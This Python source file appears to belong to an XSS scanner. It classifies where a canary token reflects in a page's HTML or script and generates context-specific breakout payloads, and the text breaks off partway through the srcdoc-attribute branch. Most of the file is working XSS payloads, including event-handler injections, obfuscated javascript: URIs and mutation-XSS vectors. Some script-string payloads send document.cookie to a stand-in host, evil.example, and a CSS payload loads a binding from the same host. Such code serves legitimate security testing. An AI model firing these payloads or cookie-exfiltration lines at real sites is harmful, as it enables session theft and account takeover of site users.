"""
DOM Reflection Analyzer & Context-Aware Payload Mutator.

When an injected probe or canary token reflects into the live DOM without executing,
inspects the exact HTML/JS syntax context and generates targeted breakout payloads
guaranteed to trigger the Zero-FP verification hook: window.__xoxss_verify(token).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import List, Optional, Tuple


_URI_ATTRIBUTES = frozenset(
    {
        "href", "src", "action", "formaction", "data", "poster",
        "background", "cite", "longdesc", "usemap", "profile", "xmlns",
    }
)


def _unquoted_tag_end(text: str, start: int) -> int:
    """Index of the first ``>`` at/after ``start`` that is not inside quotes.

    Returns ``-1`` when the tag is never closed within ``text`` (meaning the
    reflection point sits inside the tag's own attribute list).
    """
    quote = ""
    i = start
    while i < len(text):
        ch = text[i]
        if quote:
            if ch == quote:
                quote = ""
        elif ch in "\"'":
            quote = ch
        elif ch == ">":
            return i
        i += 1
    return -1


def _unclosed_quoted_attr(prefix: str) -> Optional[Tuple[str, str]]:
    """Return ``(attr_name, quote)`` when ``prefix`` ends inside a quoted
    attribute value, else ``None``.

    The pattern requires ``name="...`` or ``name='...`` with no matching
    close quote before the reflection point, which uniquely identifies the
    innermost unclosed value even mid-string.
    """
    match = re.search(r"([a-zA-Z0-9_:-]+)\s*=\s*\"[^\"]*$", prefix)
    if match:
        return match.group(1).lower(), '"'
    match = re.search(r"([a-zA-Z0-9_:-]+)\s*=\s*'[^']*$", prefix)
    if match:
        return match.group(1).lower(), "'"
    return None


def _attr_value_context(attr_name: str, quote: str) -> "DomSyntaxContext":
    """Map an attribute name + quote style to the matching syntax context."""
    if attr_name == "srcdoc":
        return DomSyntaxContext.SRCDOC_ATTR
    if attr_name == "style":
        return DomSyntaxContext.STYLE_ATTR
    if attr_name in _URI_ATTRIBUTES:
        return DomSyntaxContext.URI_ATTR
    return (
        DomSyntaxContext.ATTR_DOUBLE_QUOTE
        if quote == '"'
        else DomSyntaxContext.ATTR_SINGLE_QUOTE
    )


class DomSyntaxContext(Enum):
    """HTML and JavaScript syntax contexts for DOM reflections."""
    HTML_BODY = "html_body"
    HTML_HEAD = "html_head"
    HTML_TITLE = "html_title"          # RCDATA
    HTML_TEXTAREA = "html_textarea"    # RCDATA
    HTML_RAW_TEXT = "html_raw_text"    # xmp / iframe / noembed / noframes / noscript
    ATTR_DOUBLE_QUOTE = "attr_double_quote"
    ATTR_SINGLE_QUOTE = "attr_single_quote"
    ATTR_UNQUOTED = "attr_unquoted"
    ATTR_NAME = "attr_name"
    ATTR_VALUE_AFTER_EQ = "attr_value_after_eq"
    TAG_NAME = "tag_name"
    TAG_BODY = "tag_body"
    SCRIPT_DOUBLE_QUOTE = "script_double_quote"
    SCRIPT_SINGLE_QUOTE = "script_single_quote"
    SCRIPT_TEMPLATE = "script_template"
    SCRIPT_TEMPLATE_LITERAL = "script_template"
    SCRIPT_BARE = "script_bare"
    SCRIPT_REGEX = "script_regex"
    JSON_STRING = "json_string"
    URI_ATTR = "uri_attr"
    SRCDOC_ATTR = "srcdoc_attr"
    COMMENT = "comment"
    STYLE = "style"
    STYLE_BODY = "style_body"
    STYLE_ATTR = "style_attr"
    CDATA = "cdata"
    UNKNOWN = "unknown"


@dataclass
class ContextReflection:
    """Classified context of a reflected canary token."""
    context: DomSyntaxContext
    surrounding_html: str
    tag_name: str = ""
    attr_name: str = ""
    is_script: bool = False
    is_uri: bool = False
    canary: str = ""


class ContextMutator:
    """
    Analyzes live DOM reflections and mutates payloads tailored to breakout syntax.
    """

    def classify_dom_context(self, html: str, canary: str) -> DomSyntaxContext:
        """Convenience method returning the classified DomSyntaxContext enum directly."""
        return self.classify_reflection(html, canary).context

    def classify_reflection(self, html: str, canary: str) -> ContextReflection:
        """
        Inspect live HTML/DOM surrounding canary to classify its exact syntax context.
        """
        if not html or not canary or canary not in html:
            return ContextReflection(context=DomSyntaxContext.UNKNOWN, surrounding_html="", canary=canary)

        pos = html.find(canary)
        start = max(0, pos - 200)
        end = min(len(html), pos + len(canary) + 200)
        surrounding = html[start:end]
        prefix = html[start:pos]

        # 1. Inside CDATA section: <![CDATA[ ... CANARY ... ]]>
        lower_prefix = prefix.lower()
        if lower_prefix.rfind("<![cdata[") > lower_prefix.rfind("]]>"):
            return ContextReflection(
                context=DomSyntaxContext.CDATA,
                surrounding_html=surrounding,
                canary=canary,
            )

        # 2. Inside HTML comment: <!-- ... CANARY ... -->
        last_comment_open = prefix.rfind("<!--")
        last_comment_close = prefix.rfind("-->")
        if last_comment_open > last_comment_close:
            return ContextReflection(
                context=DomSyntaxContext.COMMENT,
                surrounding_html=surrounding,
                canary=canary,
            )

        # 3. Inside <script> block
        last_script_open = prefix.lower().rfind("<script")
        last_script_close = prefix.lower().rfind("</script")
        if last_script_open > last_script_close:
            # JSON-ish script blocks (application/json, ld+json, importmap,
            # speculationrules) reflect into a string context, not JS code.
            tag_end = prefix.find(">", last_script_open)
            open_tag = prefix[last_script_open : tag_end if tag_end != -1 else len(prefix)]
            type_match = re.search(r"type\s*=\s*['\"]?([a-zA-Z0-9_+./-]+)", open_tag, re.I)
            script_type = type_match.group(1).lower() if type_match else ""
            if any(k in script_type for k in ("json", "importmap", "speculationrules")):
                return ContextReflection(
                    context=DomSyntaxContext.JSON_STRING,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )

            # Check JS quoting context
            sub_js = prefix[last_script_open:]
            dquotes = sub_js.count('"') - sub_js.count('\\"')
            squotes = sub_js.count("'") - sub_js.count("\\'")
            backticks = sub_js.count("`") - sub_js.count("\\`")

            if dquotes % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_DOUBLE_QUOTE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            elif squotes % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_SINGLE_QUOTE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            elif backticks % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_TEMPLATE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            else:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_BARE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )

        # 4. Inside RCDATA / raw-text / <style> element content.  The open
        #    tag must be closed (unquoted ``>``) before the canary, otherwise
        #    the canary sits inside the element's own attributes (e.g.
        #    ``<iframe srcdoc="<p>CANARY">``) and section 6 handles it.
        _ELEMENT_CONTEXTS = {
            "title": DomSyntaxContext.HTML_TITLE,
            "textarea": DomSyntaxContext.HTML_TEXTAREA,
            "style": DomSyntaxContext.STYLE_BODY,
            "xmp": DomSyntaxContext.HTML_RAW_TEXT,
            "iframe": DomSyntaxContext.HTML_RAW_TEXT,
            "noembed": DomSyntaxContext.HTML_RAW_TEXT,
            "noframes": DomSyntaxContext.HTML_RAW_TEXT,
            "noscript": DomSyntaxContext.HTML_RAW_TEXT,
        }
        for tag, element_ctx in _ELEMENT_CONTEXTS.items():
            open_idx = lower_prefix.rfind(f"<{tag}")
            if open_idx > lower_prefix.rfind(f"</{tag}"):
                # Guard against prefix collisions like <stylesheet / <titles
                boundary = lower_prefix[open_idx + len(tag) + 1 : open_idx + len(tag) + 2]
                if boundary in ("", ">", "/", " ", "\t", "\n", "\r", "-"):
                    tag_end = _unquoted_tag_end(lower_prefix, open_idx)
                    if tag_end != -1 and tag_end < len(prefix):
                        return ContextReflection(
                            context=element_ctx,
                            surrounding_html=surrounding,
                            canary=canary,
                        )

        # 5. Inside an unclosed quoted attribute value: attr="...CANARY or
        #    attr='...CANARY.  Catches mid-value reflections that the
        #    endswith-quote heuristic in section 7 cannot see.
        quoted = _unclosed_quoted_attr(prefix)
        if quoted:
            attr_name, quote = quoted
            ctx = _attr_value_context(attr_name, quote)
            return ContextReflection(
                context=ctx,
                surrounding_html=surrounding,
                attr_name=attr_name,
                canary=canary,
            )

        # 6. Inside <head>...</head>
        if lower_prefix.rfind("<head") > lower_prefix.rfind("</head"):
            return ContextReflection(
                context=DomSyntaxContext.HTML_HEAD,
                surrounding_html=surrounding,
                canary=canary,
            )

        # 7. Inside an HTML tag attribute: <tag ... attr=CANARY ...>
        last_tag_open = prefix.rfind("<")
        last_tag_close = prefix.rfind(">")
        if last_tag_open > last_tag_close:
            # We are inside a tag's attributes
            tag_slice = prefix[last_tag_open:]
            tag_match = re.match(r"<\s*([a-zA-Z0-9_-]+)(.*)$", tag_slice, re.S)
            tag_name = tag_match.group(1).lower() if tag_match else ""
            rest = tag_match.group(2) if tag_match else tag_slice[1:]

            # Check attribute name
            attr_match = re.search(r"([a-zA-Z0-9_:-]+)\s*=\s*(?:['\"]?)$", tag_slice)
            attr_name = attr_match.group(1).lower() if attr_match else ""
            is_uri = attr_name in _URI_ATTRIBUTES
            is_srcdoc = attr_name == "srcdoc"
            is_style_attr = attr_name == "style"

            # Check quoting
            if prefix.endswith('"') or prefix.endswith("'"):
                quote = prefix[-1]
                ctx = _attr_value_context(attr_name, quote)
                is_uri = ctx == DomSyntaxContext.URI_ATTR
            else:
                # Unquoted / between-attributes position inside the tag
                rest_stripped = rest.strip()
                tokens = rest_stripped.split()
                last_token = tokens[-1] if tokens else ""
                if is_srcdoc:
                    ctx = DomSyntaxContext.SRCDOC_ATTR
                elif is_style_attr:
                    ctx = DomSyntaxContext.STYLE_ATTR
                elif rest == "":
                    ctx = DomSyntaxContext.TAG_NAME
                elif rest_stripped.endswith("="):
                    ctx = DomSyntaxContext.ATTR_VALUE_AFTER_EQ
                elif re.fullmatch(r"[a-zA-Z0-9_:-]+", last_token):
                    ctx = DomSyntaxContext.ATTR_NAME
                elif "=" in last_token:
                    ctx = DomSyntaxContext.ATTR_UNQUOTED
                else:
                    ctx = DomSyntaxContext.TAG_BODY

            return ContextReflection(
                context=ctx,
                surrounding_html=surrounding,
                tag_name=tag_name,
                attr_name=attr_name,
                is_uri=is_uri,
                canary=canary,
            )

        # 8. Fallback: Normal HTML Tag Body
        return ContextReflection(
            context=DomSyntaxContext.HTML_BODY,
            surrounding_html=surrounding,
            canary=canary,
        )

    def generate_breakout_payloads(
        self,
        classified_or_html: ContextReflection | str,
        token: str,
        canary: str = "",
    ) -> List[str]:
        """
        Generate targeted breakout payloads tailored to the classified reflection context.
        Accepts either a ContextReflection object or (html, token, canary).
        """
        if isinstance(classified_or_html, str):
            classified = self.classify_reflection(classified_or_html, canary or token)
        else:
            classified = classified_or_html

        verify_call = f"window.__xoxss_verify('{token}')"
        ctx = classified.context

        if ctx == DomSyntaxContext.HTML_BODY:
            return [
                # --- original --------------------------------------------------
                f"<svg/onload={verify_call}>",
                f"<img src=x onerror={verify_call}>",
                f"<script>{verify_call}</script>",
                f"<details open ontoggle={verify_call}>",
                f"<iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                # --- added: direct event handlers ----------------------------
                f"<body onload={verify_call}>",
                f"<video><source onerror={verify_call}></video>",
                f"<audio src=x onerror={verify_call}>",
                f"<marquee onstart={verify_call}>",
                f"<input autofocus onfocus={verify_call}>",
                f"<select autofocus onfocus={verify_call}>",
                f"<textarea autofocus onfocus={verify_call}>",
                f"<x onpointerover={verify_call}>x</x>",
                f"<x onclick={verify_call}>x</x>",
                # --- added: svg / mathml-driven ------------------------------
                f"<svg><script>{verify_call}</script></svg>",
                f"<svg><animate onbegin={verify_call} attributeName=x dur=1s>",
                f"<svg><set attributeName=onmouseover to={verify_call}>",
                f"<svg><a xlink:href=javascript:{verify_call}><text x=20 y=20>click</text></a></svg>",
                f"<svg><use href='data:image/svg+xml,<svg onload={verify_call}>'/>",
                # --- added: url / navigation vectors -------------------------
                f"<iframe src=javascript:{verify_call}></iframe>",
                f"<object data=javascript:{verify_call}>",
                f"<embed src=javascript:{verify_call}>",
                f"<form action=javascript:{verify_call}><input type=submit>",
                f"<button formaction=javascript:{verify_call}>go</button>",
                f"<meta http-equiv=refresh content='0;url=javascript:{verify_call}'>",
                f"<base href=javascript:{verify_call}//>",
                f"<link rel=import href=javascript:{verify_call}>",
                f"<isindex action=javascript:{verify_call} type=image>",
                f"<a href=javascript:{verify_call}>click</a>",
                f"<iframe srcdoc=\"<script>parent.{verify_call}</script>\"></iframe>",
                # --- added: obfuscated javascript: schemes -------------------
                f"<a href=\"java&#x09;script:{verify_call}\">x</a>",
                f"<a href=\"&#106;avascript:{verify_call}\">x</a>",
                f"<a href=\"javascript&colon;{verify_call}\">x</a>",
                f"<a href=\"javascript://%0A{verify_call}\">x</a>",
                # --- added: mutation-XSS (mXSS) ------------------------------
                f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror={verify_call}>",
                f"<noscript><p title=\"</noscript><img src=x onerror={verify_call}>\">",
                f"<form><math><mtext></form><form><mglyph><style></math><img src onerror={verify_call}>",
                f"<svg></p><style><a id=\"</style><img src=1 onerror={verify_call}>\">",
                # --- added: polyglots ----------------------------------------
                f"\"><svg/onload={verify_call}>",
                f"</title><svg/onload={verify_call}>",
                f"--><svg/onload={verify_call}>",
                f"'><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.ATTR_DOUBLE_QUOTE:
            return [
                # --- original --------------------------------------------------
                f'" autofocus onfocus="{verify_call}" x="',
                f'" onmouseover="{verify_call}" x="',
                f'"><svg/onload={verify_call}>',
                f'"><script>{verify_call}</script>',
                f'" style="animation-name:x" onanimationstart="{verify_call}" x="',
                # --- added: more inline handlers ----------------------------
                f'" onerror="{verify_call}" x="',
                f'" onload="{verify_call}" x="',
                f'" onclick="{verify_call}" x="',
                f'" onpointerover="{verify_call}" x="',
                f'" onfocus="{verify_call}" autofocus x="',
                f'" onmouseenter="{verify_call}" x="',
                f'" onwheel="{verify_call}" x="',
                # --- added: breakout → new tag ------------------------------
                f'"><img src=x onerror={verify_call}>',
                f'"><details open ontoggle={verify_call}>',
                f'"><iframe srcdoc=\'<script>{verify_call}</script>\'></iframe>',
                f'"><svg><script>{verify_call}</script></svg>',
                f'"><body onload={verify_call}>',
                # --- added: url / attribute sinks ---------------------------
                f'" src="javascript:{verify_call}" x="',
                f'" href="javascript:{verify_call}" x="',
                f'" formaction="javascript:{verify_call}" x="',
                f'" action="javascript:{verify_call}" x="',
                f'" xlink:href="javascript:{verify_call}" x="',
                f'" data="data:text/html,<script>{verify_call}</script>" x="',
                f'" srcdoc="<script>{verify_call}</script>" x="',
                f'" poster="javascript:{verify_call}" x="',
                # --- added: css-driven --------------------------------------
                f'" style="background:url(javascript:{verify_call})" x="',
                f'" style="background:url(\'javascript:{verify_call}\')" x="',
            ]

        elif ctx == DomSyntaxContext.ATTR_SINGLE_QUOTE:
            return [
                # --- original --------------------------------------------------
                f"' autofocus onfocus='{verify_call}' x='",
                f"' onmouseover='{verify_call}' x='",
                f"'><svg/onload={verify_call}>",
                f"'><script>{verify_call}</script>",
                f"' style='animation-name:x' onanimationstart='{verify_call}' x='",
                # --- added: more inline handlers ----------------------------
                f"' onerror='{verify_call}' x='",
                f"' onload='{verify_call}' x='",
                f"' onclick='{verify_call}' x='",
                f"' onpointerover='{verify_call}' x='",
                f"' onfocus='{verify_call}' autofocus x='",
                f"' onwheel='{verify_call}' x='",
                # --- added: breakout → new tag ------------------------------
                f"'><img src=x onerror={verify_call}>",
                f"'><details open ontoggle={verify_call}>",
                f"'><iframe srcdoc=\"<script>{verify_call}</script>\"></iframe>",
                f"'><svg><script>{verify_call}</script></svg>",
                f"'><body onload={verify_call}>",
                # --- added: url / attribute sinks ---------------------------
                f"' src='javascript:{verify_call}' x='",
                f"' href='javascript:{verify_call}' x='",
                f"' formaction='javascript:{verify_call}' x='",
                f"' action='javascript:{verify_call}' x='",
                f"' xlink:href='javascript:{verify_call}' x='",
                f"' data='data:text/html,<script>{verify_call}</script>' x='",
                f"' srcdoc='<script>{verify_call}</script>' x='",
                f"' poster='javascript:{verify_call}' x='",
                # --- added: css-driven --------------------------------------
                f"' style='background:url(javascript:{verify_call})' x='",
            ]

        elif ctx == DomSyntaxContext.ATTR_UNQUOTED:
            return [
                # --- original --------------------------------------------------
                f" autofocus onfocus={verify_call}",
                f" onmouseover={verify_call}",
                f"><svg/onload={verify_call}>",
                f"><script>{verify_call}</script>",
                # --- added: attr injection (space-terminated) --------------
                f" onerror={verify_call} src=x x=",
                f" onload={verify_call} x=",
                f" onclick={verify_call} x=",
                f" onpointerover={verify_call} x=",
                f" x=1 autofocus onfocus={verify_call}",
                # --- added: url sink without quotes ------------------------
                f" javascript:{verify_call}",
                # --- added: backtick value (legacy IE / Edge HTML) ---------
                f" onmouseover=`{verify_call}` x=",
                # --- added: breakout → new tag ------------------------------
                f"><img src=x onerror={verify_call}>",
                f"><details open ontoggle={verify_call}>",
                f"><svg><script>{verify_call}</script></svg>",
                f"/><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_DOUBLE_QUOTE:
            return [
                # --- original --------------------------------------------------
                f'"-{verify_call}-"',
                f'";{verify_call};//',
                f'";{verify_call};"',
                f'</script><svg/onload={verify_call}>',
                f'</script><script>{verify_call}</script>',
                # --- added: backslash-escape the quote ---------------------
                f'\\";{verify_call};//',
                f'\\\\";{verify_call};//',
                # --- added: unicode / hex escape of the quote --------------
                f'\\u0022;{verify_call};//',
                f'\\x22;{verify_call};//',
                # --- added: expression breakouts ---------------------------
                f'"+({verify_call})+"',
                f'"||({verify_call})||"',
                f'"&&({verify_call})&&"',
                f'"?({verify_call}):("")"',
                f'";({verify_call});"',
                f'"}};({verify_call});{{"',
                f'"}},{verify_call},{{"',
                # --- added: indirect / aliased execution -------------------
                f'";(0,eval)(atob(btoa("{verify_call}")))//',
                f'";[].constructor.constructor("{verify_call}")()//',
                f'";Function("{verify_call}")()//',
                f'";setTimeout("{verify_call}",0)//',
                f'";top["al"+"ert"]("{verify_call}")//',
                # --- added: exfil / sink pivot ------------------------------
                '";fetch("//evil.example/?c="+encodeURIComponent(document.cookie))//',
                '";new Image().src="//evil.example/"+document.cookie//',
                # --- added: script-tag breakouts (HTML parser) ------------
                f'</script><img src=x onerror={verify_call}>',
                f'</script><details open ontoggle={verify_call}>',
                f'</script><iframe srcdoc=\'<script>{verify_call}</script>\'></iframe>',
            ]

        elif ctx == DomSyntaxContext.SCRIPT_SINGLE_QUOTE:
            return [
                # --- original --------------------------------------------------
                f"'-{verify_call}-'",
                f"';{verify_call};//",
                f"';{verify_call};'",
                f'</script><svg/onload={verify_call}>',
                f'</script><script>{verify_call}</script>',
                # --- added: backslash-escape the quote ---------------------
                f"\\';{verify_call};//",
                f"\\\\';{verify_call};//",
                # --- added: unicode / hex escape --------------------------
                f"\\u0027;{verify_call};//",
                f"\\x27;{verify_call};//",
                # --- added: expression breakouts ---------------------------
                f"'+({verify_call})+'",
                f"'||({verify_call})||'",
                f"'&&({verify_call})&&'",
                f"'?({verify_call}):('')'",
                f"';({verify_call});'",
                f"'}};({verify_call});{{'",
                f"'}},{verify_call},{{'",
                # --- added: indirect / aliased execution -------------------
                f"';[].constructor.constructor(\"{verify_call}\")()//",
                f"';Function(\"{verify_call}\")()//",
                f"';setTimeout(\"{verify_call}\",0)//",
                # --- added: script-tag breakouts ---------------------------
                f"'</script><img src=x onerror={verify_call}>",
                f"'</script><details open ontoggle={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_TEMPLATE:
            return [
                # --- original --------------------------------------------------
                f"${{{verify_call}}}",
                f"`-{verify_call}-`",
                f"</script><svg/onload={verify_call}>",
                # --- added: template-literal breakouts --------------------
                f"`+({verify_call})+`",
                f"`}};${{{verify_call}}};${{`",
                f"\\`${{{verify_call}}}\\`",
                f"${{{verify_call}}};({verify_call})",
                f"${{`${{{verify_call}}}`}}",
                # --- added: aliased execution ----------------------------
                f"${{Function(\"{verify_call}\")()}}",
                f"${{[].constructor.constructor(\"{verify_call}\")()}}",
                f"${{(0,eval)(\"{verify_call}\")}}",
                f"${{setTimeout(\"{verify_call}\",0)}}",
                # --- added: script-tag breakouts -------------------------
                f"</script><script>{verify_call}</script>",
                f"</script><img src=x onerror={verify_call}>",
                f"</script><details open ontoggle={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_BARE:
            return [
                # --- original --------------------------------------------------
                f";{verify_call};//",
                f"({verify_call})",
                f"{verify_call}",
                # --- added: comment / newline wrapping -------------------
                f"/*{verify_call}*/",
                f"\n{verify_call}\n",
                f";({verify_call});",
                f",({verify_call}),",
                f";{verify_call};/*",
                f"//{verify_call}\n",
                # --- added: expression breakouts ------------------------
                f"||({verify_call})||",
                f"&&({verify_call})&&",
                f"?({verify_call}):0",
                f"}}({verify_call}){{",
                f"){verify_call}(",
                # --- added: aliased execution --------------------------
                f"(0,eval)(\"{verify_call}\")",
                f"[].constructor.constructor(\"{verify_call}\")()",
                f"Function(\"{verify_call}\")()",
                f"setTimeout(\"{verify_call}\",0)",
                # --- added: tag breakouts ------------------------------
                f"</script><svg/onload={verify_call}>",
                f"</script><script>{verify_call}</script>",
            ]

        elif ctx == DomSyntaxContext.URI_ATTR:
            return [
                # --- original --------------------------------------------------
                f"javascript:{verify_call}",
                f"javascript:void({verify_call})",
                f"data:text/html,<script>{verify_call}</script>",
                f'" autofocus onfocus="{verify_call}" x="',
                f'"><svg/onload={verify_call}>',
                # --- added: obfuscated javascript: ----------------------
                f"javascript://%0A{verify_call}",
                f"javascript:/*{verify_call}*/",
                f"java%0ascript:{verify_call}",
                f"java%09script:{verify_call}",
                f"java%0dscript:{verify_call}",
                f"\\x0Bjavascript:{verify_call}",
                f"\\xE2\\x80\\x89javascript:{verify_call}",
                f"jav&#x09;ascript:{verify_call}",
                f"&#106;avascript:{verify_call}",
                f"javascript&colon;{verify_call}",
                f"javasCRipt:{verify_call}",
                f"javascript:void(({verify_call}))",
                # --- added: data URI variants ---------------------------
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                f"data:text/html;charset=utf-8,<script>{verify_call}</script>",
                f"data:image/svg+xml,<svg onload={verify_call}>",
                f"data:application/javascript,{verify_call}",
                # --- added: legacy -------------------------------------
                f"vbscript:{verify_call}",
                # --- added: attribute breakouts --------------------------
                f"' autofocus onfocus='{verify_call}' x='",
                f"'><svg/onload={verify_call}>",
                f'"><img src=x onerror={verify_call}>',
                f'"><script>{verify_call}</script>',
                # --- added: srcdoc / formaction / xlink ----------------
                f'" srcdoc="<script>{verify_call}</script>" x="',
                f'" formaction="javascript:{verify_call}" x="',
                f'" xlink:href="javascript:{verify_call}" x="',
            ]

        elif ctx == DomSyntaxContext.COMMENT:
            return [
                # --- original --------------------------------------------------
                f"--> <svg/onload={verify_call}>",
                f"--><script>{verify_call}</script>",
                # --- added: comment-closing variants --------------------
                f"--!> <svg/onload={verify_call}>",
                f"--!><script>{verify_call}</script>",
                f"--><img src=x onerror={verify_call}>",
                f"--!><img src=x onerror={verify_call}>",
                f"--><svg><script>{verify_call}</script></svg>",
                f"--><details open ontoggle={verify_call}>",
                f"--><body onload={verify_call}>",
                f"--><iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                f"--><math><mtext><img src=x onerror={verify_call}>",
                # --- added: conditional-comment escape (legacy IE) ------
                f"<![endif]--><svg/onload={verify_call}><!--",
                f"<![endif]--><script>{verify_call}</script><!--",
            ]

        # ------------------------------------------------------------------
        # --- added: full-document contexts --------------------------------
        # ------------------------------------------------------------------

        elif ctx == DomSyntaxContext.HTML_HEAD:
            return [
                f"<script>{verify_call}</script>",
                f"</title><script>{verify_call}</script>",
                f"<meta http-equiv=refresh content='0;url=javascript:{verify_call}'>",
                f"<base href=javascript:{verify_call}//>",
                f"<link rel=stylesheet href='javascript:{verify_call}'>",
                f"<link rel=import href='javascript:{verify_call}'>",
                f"<style>@import 'javascript:{verify_call}';</style>",
                f"<style>body{{background:url('javascript:{verify_call}')}}</style>",
                f"<svg/onload={verify_call}>",
                f"</head><svg/onload={verify_call}><head>",
                f"</head><body onload={verify_call}><head>",
            ]

        elif ctx == DomSyntaxContext.HTML_TITLE:  # RCDATA
            return [
                f"</title><svg/onload={verify_call}>",
                f"</title><script>{verify_call}</script>",
                f"</title><img src=x onerror={verify_call}>",
                f"</title><details open ontoggle={verify_call}>",
                f"</title><iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                f"</TITLE><svg/onload={verify_call}>",
                f"</title ><svg/onload={verify_call}>",
                f"</title\t><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.HTML_TEXTAREA:  # RCDATA
            return [
                f"</textarea><svg/onload={verify_call}>",
                f"</textarea><script>{verify_call}</script>",
                f"</textarea><img src=x onerror={verify_call}>",
                f"</textarea><details open ontoggle={verify_call}>",
                f"</textarea><iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                f"</TEXTAREA><svg/onload={verify_call}>",
                f"</textarea ><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.HTML_RAW_TEXT:  # xmp / iframe / noembed / noframes / noscript(scripting off)
            return [
                f"</xmp><svg/onload={verify_call}>",
                f"</iframe><svg/onload={verify_call}>",
                f"</noembed><svg/onload={verify_call}>",
                f"</noframes><svg/onload={verify_call}>",
                f"</noscript><svg/onload={verify_call}>",
                f"</style><svg/onload={verify_call}>",
                f"</script><svg/onload={verify_call}>",
            ]

        # ------------------------------------------------------------------
        # --- added: inside a start-tag -----------------------------------
        # ------------------------------------------------------------------

        elif ctx == DomSyntaxContext.TAG_NAME:
            # We are placed where a tag name goes (`<INJECTION ...>`).
            return [
                f"img src=x onerror={verify_call}>",
                f"svg/onload={verify_call}>",
                f"script>{verify_call}</script>",
                f"iframe src=javascript:{verify_call}></iframe>",
                f"details open ontoggle={verify_call}>",
                f"body onload={verify_call}>",
                f"x onmouseover={verify_call}>x</x>",
                # attr-injection if a tag-name context is followed by `=` etc.
                f"x onmouseover={verify_call} x=",
            ]

        elif ctx == DomSyntaxContext.TAG_BODY:
            # Inside an already-open tag, e.g. `<div INJECTION>`.
            return [
                f" onmouseover={verify_call} x=",
                f" autofocus onfocus={verify_call} x=",
                f" onclick={verify_call} x=",
                f" onpointerover={verify_call} x=",
                f" onerror={verify_call} src=x x=",
                f" x=1 onmouseover={verify_call} x=",
                f"/><svg/onload={verify_call}>",
                f" x=1></svg><svg/onload={verify_call}>",
                f" x=1><img src=x onerror={verify_call}>",
                f" x=1><script>{verify_call}</script>",
            ]

        elif ctx == DomSyntaxContext.ATTR_NAME:
            # Placed where an attribute name goes: `<tag INJECTION=value>`.
            return [
                f" onmouseover={verify_call} x",
                f" autofocus onfocus={verify_call} x",
                f" onclick={verify_call} x",
                f" onerror={verify_call} src=x x",
                f" x=1 onmouseover={verify_call} x",
                f" x={verify_call} autofocus onfocus={verify_call} x",
                f" x=1><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.ATTR_VALUE_AFTER_EQ:
            # Right after `=` before the value starts (could be unquoted, "…", '…').
            return [
                f"javascript:{verify_call}",
                f"javascript:void({verify_call})",
                f"data:text/html,<script>{verify_call}</script>",
                f" autofocus onfocus={verify_call} x=",
                f" onmouseover={verify_call} x=",
                f" x=1 onmouseover={verify_call} x=",
                f'"><svg/onload={verify_call}>',
                f"'><svg/onload={verify_call}>",
                f"/><svg/onload={verify_call}>",
            ]

        # ------------------------------------------------------------------
        # --- added: CSS & JS sub-contexts --------------------------------
        # ------------------------------------------------------------------

        elif ctx == DomSyntaxContext.STYLE_BODY:
            return [
                f"</style><svg/onload={verify_call}>",
                f"</style><script>{verify_call}</script>",
                f"</style><img src=x onerror={verify_call}>",
                f"</style><details open ontoggle={verify_call}>",
                f"</style><iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                f"@import 'javascript:{verify_call}';",
                f"body{{background:url('javascript:{verify_call}')}}",
                f"body{{background:url(javascript:{verify_call})}}",
                "body{-moz-binding:url('http://evil.example/x.xml#xss')}",
                "body{behavior:url(xss.htc)}",
                f"body{{background:expression({verify_call})}}",
            ]

        elif ctx == DomSyntaxContext.STYLE_ATTR:
            return [
                # double-quoted style="…"
                f';animation-name:x" onanimationstart="{verify_call}" x="',
                f';background:url(javascript:{verify_call})" x="',
                ';-moz-binding:url(http://evil.example/x.xml#xss)" x="',
                f';background:expression({verify_call})" x="',
                # single-quoted style='…'
                f";animation-name:x' onanimationstart='{verify_call}' x='",
                f";background:url(javascript:{verify_call})' x='",
                # unquoted style=…
                f";animation-name:x onanimationstart={verify_call} x=",
                f";background:url(javascript:{verify_call}) x=",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_REGEX:
            # Inside a regex literal: /INJECTION/flags
            return [
                f"[\\s\\S]*/;{verify_call};//",
                f"[\\s\\S]*/;({verify_call});/*",
                f"x/.test('x');{verify_call};/x/",
                f"/;{verify_call};/*",
                f"/;/;{verify_call};/*",
                f"\\x2f;{verify_call};\\x2f",
                f"\\u002f;{verify_call};\\u002f",
                f"</script><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.JSON_STRING:
            return [
                f'";{verify_call};//',
                f'\\";{verify_call};//',
                f'\\u0022;{verify_call};//',
                f'";({verify_call});"',
                f'"+({verify_call})+"',
                f'";[].constructor.constructor(\\"{verify_call}\\")()//',
                f"';{verify_call};//",
                f"</script><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.CDATA:
            return [
                f"]]><svg/onload={verify_call}>",
                f"]]><script>{verify_call}</script>",
                f"]]><img src=x onerror={verify_call}>",
                f"]]><details open ontoggle={verify_call}>",
                f"]]><iframe srcdoc='<script>{verify_call}</script>'></iframe>",
                f"]]><!--{verify_call}-->",
            ]

        elif ctx == DomSyntaxContext.SRCDOC_ATTR:
            return [
